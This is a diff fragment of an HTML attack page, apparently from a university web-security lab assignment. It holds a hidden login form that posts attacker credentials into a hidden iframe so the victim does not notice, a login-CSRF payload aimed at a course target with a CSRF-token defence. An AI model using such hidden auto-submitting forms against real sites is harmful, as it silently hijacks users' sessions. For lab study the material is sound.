@@ -10,8 +10,8 @@
   <!-- send the output of the form to the hidden iframe so the user doesn't see it -->
   <form id="loginForm" method="post" action="http://cpsc4200.mpese.com/login?csrfdefense=1&xssdefense=0"
     target="hiddenFrame" style="display:none">
-    <input name="username" type="hidden" value="attacker">
-    <input name="password" type="hidden" value="l33th4x">
+    <input id="username" name="username" type="hidden" value="attacker">
+    <input id="userpass" name="password" type="hidden" value="l33th4x">
     <input id="csrf_token" name="csrf_token" type="hidden" value="">
   </form>
 
